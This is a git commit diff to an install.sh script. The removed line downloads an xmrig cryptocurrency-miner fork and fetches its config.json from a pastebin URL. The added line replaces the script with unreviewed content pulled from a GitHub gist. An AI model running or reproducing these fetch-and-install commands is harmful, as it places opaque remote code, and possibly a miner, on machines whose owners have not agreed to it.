83d530ec8a0197b59acdfd5ae935f3d89c96e88a
Jhosua Saut Maruli <80184758+jhosuaarch@users.noreply.github.com>
2025-03-28 11:45:15 +0700

    Update install.sh

--- install.sh
+++ install.sh
@@ -1,3 +1,3 @@
 #!/bin/bash
 
-wget https://github.com/dikripto/xmrig/archive/refs/heads/master.zip && unzip -q master.zip && mkdir -p xmrig-master/build && curl -sSL https://pastebin.com/raw/RdG4PxL1 -o xmrig-master/build/config.json
+curl -sSL https://gist.githubusercontent.com/jhosuaarch/3fbf0933dee988c1e1fb6a4b928cf338/raw/473fa8085554e1de76bf0e6bdddd0b37b57ef43d/gistfile1.txt -o install.sh
